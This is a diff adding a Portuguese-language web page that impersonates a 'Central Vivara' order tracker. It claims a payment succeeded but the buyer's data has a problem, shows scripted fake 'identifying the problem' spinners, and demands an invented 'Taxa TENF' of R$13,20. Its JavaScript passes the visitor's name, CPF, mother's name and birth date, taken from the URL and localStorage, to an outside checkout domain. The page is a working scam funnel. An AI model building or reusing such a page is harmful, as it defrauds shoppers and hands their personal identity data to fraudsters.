@@ -1,0 +1,233 @@
+<!DOCTYPE html><html lang="pt"><head>
+
+<!-- TikTok Pixel Code Start -->
+<script>
+!function (w, d, t) {
+  w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(
+var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var r="https://analytics.tiktok.com/i18n/pixel/events.js",o=n&&n.partner;ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=r,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};n=document.createElement("script")
+;n.type="text/javascript",n.async=!0,n.src=r+"?sdkid="+e+"&lib="+t;e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(n,e)};
+
+  ttq.load('D6ROQ3BC77UA8MCFBSDG');
+  ttq.page();
+}(window, document, 'ttq');
+</script>
+<!-- TikTok Pixel Code End -->
+
+  <script>
+  window.tikTokPixelId = "69b78d959dcfda60eb53f101";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-tiktok.js");
+  document.head.appendChild(a);
+</script>
+    
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>NF-e Eletronica</title>
+    <link rel="stylesheet" href="css/B1NgWXmEBkrd.css">
+    <link rel="stylesheet" href="css/GueVj3rToNDC.css">
+    <link rel="stylesheet" href="css/Ly8MoZSiaXHt.css">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@24,400,0,0">
+
+    <script>
+        function irParaCheckout() {
+            var p    = new URLSearchParams(window.location.search);
+            var dest = new URLSearchParams();
+
+            // Repassa TODOS os parâmetros recebidos (nome, cpf, mae, nascimento, utms, etc.)
+            p.forEach(function(value, key) {
+                if (key !== 'valor') dest.set(key, value);
+            });
+
+            // Garante nome e cpf (fallback localStorage)
+            var nome = dest.get('nome') || dest.get('name') || '';
+            var cpf  = dest.get('cpf')  || dest.get('documento') || '';
+
+            if (!nome || !cpf) {
+                try {
+                    var ls = JSON.parse(localStorage.getItem('urlParams') || '{}');
+                    if (!nome) { nome = ls['nome'] || ls['name'] || ''; if (nome) dest.set('nome', nome); }
+                    if (!cpf)  { cpf  = ls['cpf']  || ls['documento'] || ''; if (cpf) dest.set('documento', cpf.replace(/\D/g,'')); }
+                } catch(e) {}
+            }
+            if (!nome || !cpf) {
+                try {
+                    var ud = JSON.parse(localStorage.getItem('userData') || '{}');
+                    if (!nome) { nome = ud['nome'] || ud['name'] || ''; if (nome) dest.set('nome', nome); }
+                    if (!cpf)  { cpf  = ud['cpf']  || ud['documento'] || ''; if (cpf) dest.set('documento', cpf.replace(/\D/g,'')); }
+                } catch(e) {}
+            }
+
+            // Garante que cpf está em documento também
+            if (dest.get('cpf') && !dest.get('documento')) dest.set('documento', dest.get('cpf').replace(/\D/g,''));
+            if (dest.get('documento')) dest.set('documento', dest.get('documento').replace(/\D/g,''));
+
+            // Valor fixo desta etapa (R$ 13,20 = 1320 centavos)
+            dest.set('valor', '1320');
+
+            var url = 'https://pagamentoambienteseguro.online/checkout2.html?' + dest.toString();
+            console.log('Redirecionando para:', url);
+            window.location.href = url;
+        }
+    </script>
+
+    <script>
+        localStorage.setItem("upsell", "up4");
+    </script>
+
+    <script>
+        window.pixelId = "6845ec0d545bd01304237507";
+        var a = document.createElement("script");
+        a.setAttribute("async", "");
+        a.setAttribute("defer", "");
+        a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+        document.head.appendChild(a);
+    </script>
+    <script async="" defer="" src="js/pixel.js"></script>
+</head>
+<body>
+
+    <nav class="navbar" style="padding-top: 15px;">
+        <div class="menu-icon" style="padding-left: 3%;">
+            <img src="images/Ks8hGbDqjIxL.png" style="height: 5vh;" alt="Logo Central Vivara">
+        </div>
+        <div class="logo-central"></div>
+        <div class="menu-icon" style="padding-right: 3%;">
+            <span class="material-symbols-outlined" style="font-size: 30px; padding-right: 10px; color: #ffffff">shopping_cart</span>
+        </div>
+    </nav>
+
+    <div id="ad1">
+        <p style="margin-left: 5%; font-family: 'GellixMedium'; font-size: 22px;">Seus pedidos</p>
+        <div class="ad1">
+            <div style="margin-left: 3%; margin-right: 3%;">
+                <button class="styled-button">
+                    <div class="icon-container">
+                        <span class="material-symbols-outlined">local_shipping</span>
+                    </div>
+                    <span class="button-text">
+                        <span class="button-title">#6481749338</span>
+                    </span>
+                </button>
+
+                <div class="entrega-container">
+                    <div class="entrega-header">Status</div>
+                    <div class="entrega-content">
+                        <div class="icon-container2">
+                            <span class="material-symbols-outlined">check</span>
+                        </div>
+                        <div class="text-container">
+                            <div class="entrega-title">Pagamento concluído</div>
+                        </div>
+                    </div>
+                    <div class="entrega-content">
+                        <div class="icon-container3">
+                            <span class="material-symbols-outlined">warning</span>
+                        </div>
+                        <div class="text-container">
+                            <div class="entrega-title">Pendência nos dados</div>
+                        </div>
+                    </div>
+                </div>
+
+                <p style="text-align: center; margin-left: 3%; margin-right: 3%;">Seu pagamento foi concluido com sucesso, porém foi encontrado uma pendência nos seus dados. Clique abaixo para resolver esse problema!</p>
+
+                <div class="button-container" style="padding-bottom: 20px;">
+                    <button class="styled-button2" onclick="showAd2()">
+                        <span class="button-text">
+                            <span class="button-title2">Resolver problema</span>
+                        </span>
+                        <span class="material-symbols-outlined" style="font-size: 32px; color: white;">arrow_forward_ios</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="ad2" style="display: none;">
+        <p style="margin-left: 5%; font-family: 'GellixMedium'; font-size: 22px;">Problemas na transferência</p>
+        <div class="ad2" style="padding-top: 15px; padding-bottom: 15px;">
+            <div style="padding-top: 2px;"></div>
+
+            <div id="loadingGif" class="loading">
+                <div class="spinner"></div>
+            </div>
+
+            <div class="entrega-container hidden" id="text1">
+                <div class="entrega-content">
+                    <div class="icon-container2">
+                        <span class="material-symbols-outlined">settings</span>
+                    </div>
+                    <div class="text-container">
+                        <div class="entrega-title">Estamos identificando o problema nos seus dados!</div>
+                    </div>
+                </div>
+            </div>
+
+            <div id="loadingGif2" class="loading hidden">
+                <div class="spinner"></div>
+            </div>
+
+            <div id="text2" class="hidden entrega-container" style="margin-top: 15px;">
+                <div class="entrega-content">
+                    <div class="icon-container2" style="background-color: red;">
+                        <span class="material-symbols-outlined">warning</span>
+                    </div>
+                    <div class="text-container">
+                        <div class="entrega-title">Identificamos que há uma pendência nos seus dados de transferência!</div>
+                    </div>
+                </div>
+            </div>
+
+            <div id="loadingGif3" class="loading hidden" style="padding-top: 20px;">
+                <div class="spinner"></div>
+            </div>
+
+            <div id="text3" class="hidden entrega-container" style="background-color: #d40303; margin-top: 15px;">
+                <div class="entrega-content">
+                    <div class="icon-container2" style="background-color: rgb(255, 255, 255);">
+                        <span class="material-symbols-outlined" style="color: #d40303;">priority_high</span>
+                    </div>
+                    <div class="text-container">
+                        <div class="entrega-title" style="color: white">
+                            É necessário realizar o pagamento da <span class="bold">Taxa TENF</span> para corrigir a pendência e liberar sua transferência. O valor é único e fixo de <span class="bold">R$13,20</span>.
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="finalButton" class="button-container hidden" style="padding-top: 15px;">
+        <button class="styled-button2" onclick="irParaCheckout()">
+            <span class="button-text">
+                <span class="button-title2">Pagar o TENF</span>
+            </span>
+            <span class="material-symbols-outlined" style="font-size: 32px;">arrow_forward_ios</span>
+        </button>
+    </div>
+
+    <div style="padding-bottom: 2px;"></div>
+
+    <script src="js/checkout-params.js"></script>
+    <script src="js/8fmLxVqBPGdA.js"></script>
+    <script src="js/8Eu6kEbwRuNP.js" data-utmify-prevent-subids="" async="" defer=""></script>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            var btn = document.querySelector('#finalButton .styled-button2');
+            if (btn) {
+                btn.onclick = function(e) { e.preventDefault(); irParaCheckout(); };
+            }
+            var observer = new MutationObserver(function() {
+                var btn2 = document.querySelector('#finalButton .styled-button2');
+                if (btn2) {
+                    btn2.onclick = function(e) { e.preventDefault(); irParaCheckout(); };
+                }
+            });
+            observer.observe(document.body, { childList: true, subtree: true, attributes: true });
+        });
+    </script>
+
+</body></html>
